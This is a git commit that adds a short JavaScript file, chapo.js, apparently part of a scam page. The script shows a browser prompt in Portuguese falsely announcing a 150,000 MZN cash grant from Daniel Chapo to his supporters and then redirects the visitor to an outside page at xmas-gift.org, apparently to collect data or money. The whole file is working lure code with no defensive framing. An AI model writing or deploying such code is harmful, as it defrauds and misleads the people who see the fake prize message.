dce9b54cca1cb88bc382f492f0cdcaffc097bc31
4g-network <154092422+4g-network@users.noreply.github.com>
2024-10-27 04:28:41 -0700

    Create chapo.js

---
+++ chapo.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR 150.000MZN'
+password=prompt('SMS: Parabéns, você está qualificado para DANIEL CHAPO 150.000MZN CONCESSÃO EM DINHEIRO PARA SEUS APOIADORES. Por favor, pressione OK para retirar o prêmio em dinheiro   ','RETIR 150.000MZN');
+if (password != 'RETIR 150.000MZN') {
+location.href='https://xmas-gift.org/chapo-grant.html';
+}
